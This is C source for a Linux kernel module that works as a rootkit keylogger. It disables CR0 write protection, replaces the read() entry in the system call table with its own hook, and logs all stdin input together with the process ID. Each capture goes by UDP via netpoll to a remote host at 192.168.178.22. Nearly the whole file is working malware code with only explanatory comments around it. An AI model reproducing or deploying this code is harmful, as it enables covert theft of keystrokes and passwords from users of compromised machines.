#include <linux/module.h>   /* Needed by all modules */
#include <linux/unistd.h>   /* Needed for __NR_read */
#include <linux/reboot.h>   /* Needed for kernel_restart() */
#include "sysmap.h"   /* Needed for ROOTKIT_SYS_CALL_TABLE */

#include <linux/string.h>
#include <linux/netpoll.h>
#include <linux/etherdevice.h>

#define CR0_WRITE_PROTECT_MASK (1 << 16)
#define LOG_PREF "PID %d says: %s\n"
#define MAX_PID_CHARS 10

void **sys_call_table;
asmlinkage long (*read_syscall_ref)(unsigned int fd, char __user *buf, size_t count);
int pos;
struct netpoll *np;

static void netlogger_init(void)
{
	char target_config[] = "6665@0.0.0.0/eth0,6666@192.168.178.22/ff:ff:ff:ff:ff:ff";
	if (np)
		return;

	np = kzalloc(sizeof(struct netpoll), GFP_KERNEL);
	if (!np)
		return;

	np->name = THIS_MODULE->name;
	strlcpy(np->dev_name, "eth0", IFNAMSIZ);
	//np->.rx_hook = netlog_rx_hook;
	np->local_port = 6665;
	np->remote_port = 6666;
	eth_broadcast_addr(np->remote_mac);


	if (netpoll_parse_options(np, target_config))
		goto fail;

	if (netpoll_setup(np))
		goto fail;

	return;

fail:
	kfree(np);
	np = NULL;
}

static void netlogger_exit(void)
{
	if (!np)
		return;

	netpoll_cleanup(np);
	kfree(np);
	np = NULL;
}

static void netlogger_send(int pid, char *buf, unsigned int len)
{
	char *msg = NULL;
	int msg_size = 0;

	if (!np)
		return;

	msg_size = strlen(LOG_PREF) + len + MAX_PID_CHARS;
	msg = kzalloc(msg_size, GFP_KERNEL);
	if (!msg)
		return;

	msg_size = snprintf(msg, msg_size, LOG_PREF, pid, buf);

	if (msg_size <= 0) {
		printk(KERN_INFO "Somehting went wrong\n");
		return;
	}

	netpoll_send_udp(np, msg, msg_size);
	kfree(msg);
}

asmlinkage long my_read_syscall_ref(unsigned int fd, char __user *buf, size_t count)
{
	long ret;

	/* Call original read_syscall */
	ret = read_syscall_ref(fd, buf, count);

	/* A keypress has a length of 1 byte and is read from STDIN (fd == 0) */
	if (fd != 0)
		return ret;

	netlogger_send(current->pid, buf, count);
	return ret;
}


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the read() syscall. */
static int __init interceptor_start(void)
{
	unsigned long original_cr0;

	netlogger_init();
	netlogger_send(-1, "netlogger_started", 17);

	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	original_cr0 = read_cr0();

    /* Disable `write-protect` mode. Do so by setting the WP (Write protect)
       bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);

	/* Store original read() syscall */
	sys_call_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	read_syscall_ref = (void *) sys_call_table[__NR_read];

	/* Replace in the system call table the original
	   read() syscall with our intercepting function */
	sys_call_table[__NR_read] = (unsigned long *) my_read_syscall_ref;

	/* Enable `write-protect` mode */
	write_cr0(original_cr0);


	printk(KERN_INFO "%s\n", "Hello");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original read() syscall. */
static void __exit interceptor_end(void)
{

	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

    /* Disable `write-protect` mode */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);

	/* Restore original read() syscall */
	sys_call_table[__NR_read] = (unsigned long *) read_syscall_ref;

	/* Enable `write-protect` mode */
	write_cr0(original_cr0);
	
	netlogger_send(-1, "netlogger exiting", 17);
	netlogger_exit();

	printk(KERN_INFO "%s\n", "Bye bye");

	return;
}

module_init(interceptor_start);
module_exit(interceptor_end);

MODULE_LICENSE("GPL");
